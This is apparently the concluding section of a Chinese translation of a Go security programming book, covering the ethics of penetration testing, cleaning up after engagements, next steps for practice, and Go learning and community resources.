还有一些道德边界需要注意，这些与法律边界不同。道德边界对一些人来说可能是一个灰色地带。例如，对于社会工程，如果你针对员工，你认为在工作时间之外尝试社会工程是可以接受的吗？向他们的个人邮箱发送钓鱼邮件是否可以接受？冒充另一名员工并对某人撒谎是否可以接受？道德的其他方面涉及你在受损服务器上的行为以及你对发现的数据的处理。如果在渗透测试期间泄露了客户数据，将其存储在离线位置是否可以接受？在渗透测试期间在客户的生产服务器上创建自己的用户是否可以接受？对于不同情况，有些人可能对道德边界的位置持不同意见。重要的是要意识到这些类型的事情，并在参与之前与任何客户讨论。

除了法律和道德方面，了解工具对服务器、网络、负载均衡器、交换机等的技术影响和物理负载也是至关重要的。确保在网络爬虫和暴力破解器上设置合理的限制。此外，确保记录和跟踪你所采取的任何行动，以便你可以撤销任何永久性的更改。如果你为客户执行渗透测试，你不应该在他们的服务器上留下不必要的文件。例如，如果你安装了一个反向绑定 shell，确保你卸载它。如果你修改了文件权限或安装了一个绑定 shell，请确保你没有让客户暴露在外部攻击之下。

在安全领域工作时有很多需要注意的事情，但很多都归结为常识和谨慎。尊重你攻击的服务器，如果你不明白后果，不要采取任何行动。如果不确定，寻求来自可信赖和有经验的同行或社区的指导。

# 接下来该做什么

开始建立你的工具箱和菜谱。使用对你有用的示例，并根据自己的需求进行定制。利用现有示例并加以扩展。你能想到其他的想法吗？你如何修改一些程序使其更有用？有没有一些示例在你自己的工具箱中可以直接使用？它们给了你其他自定义工具的想法吗？探索更多 Go 标准库并编写应用程序来填充你的工具箱。

开始练习并使用提供的一些工具。你可能需要找到或构建自己的测试网络，或者只是一个简单的虚拟机，或者找到一个漏洞赏金计划。如果你决定尝试漏洞赏金计划，请务必仔细阅读范围和规则。要将你的新工具和技能付诸实践，研究应用程序测试和网络渗透方法。如果你想成为一名渗透测试员或者只是想了解更多关于渗透测试方法和在安全实验室环境中的实践，那么我强烈推荐 Offensive Security 在[`www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/`](https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/)提供的**Offensive Security Certified Professional**（**OSCP**）课程。

# 获取帮助和学习更多

要了解更多关于 Go、其语言设计和规范以及标准库的信息，请查看以下链接：

+   godoc 的内置文档

+   在线 Go 文档：[`golang.org/doc/`](https://golang.org/doc/)

+   学习 Go 语言的导览：[`tour.golang.org/`](https://tour.golang.org/)

+   Go 标准库文档：[`golang.org/pkg/`](https://golang.org/pkg/)

社区是获取帮助和找到合作伙伴的好地方。在线社区和线下社区各有利弊。以下是一些寻求 Go 帮助的地方：

+   #go-nuts Freenode.net IRC 频道: [`irc.lc/freenode/go-nuts`](http://irc.lc/freenode/go-nuts)

+   Go 论坛: [`forum.golangbridge.org`](https://forum.golangbridge.org)

+   Go Nuts 邮件列表: [`groups.google.com/group/golang-nuts`](https://groups.google.com/group/golang-nuts)

+   本地见面会: [`www.meetup.com`](https://www.meetup.com)

+   Go FAQ: [`golang.org/doc/faq`](https://golang.org/doc/faq)

+   Stack Overflow: [`stackoverflow.com`](https://stackoverflow.com)

+   Golang Subreddit: [`www.reddit.com/r/golang/`](https://www.reddit.com/r/golang/)

继续学习，应用从本书中学到的知识。编写自己的工具来实现目标。探索其他第三方包，或考虑包装或移植 Go 缺少的 C 库。尝试使用这种语言。最重要的是继续学习！
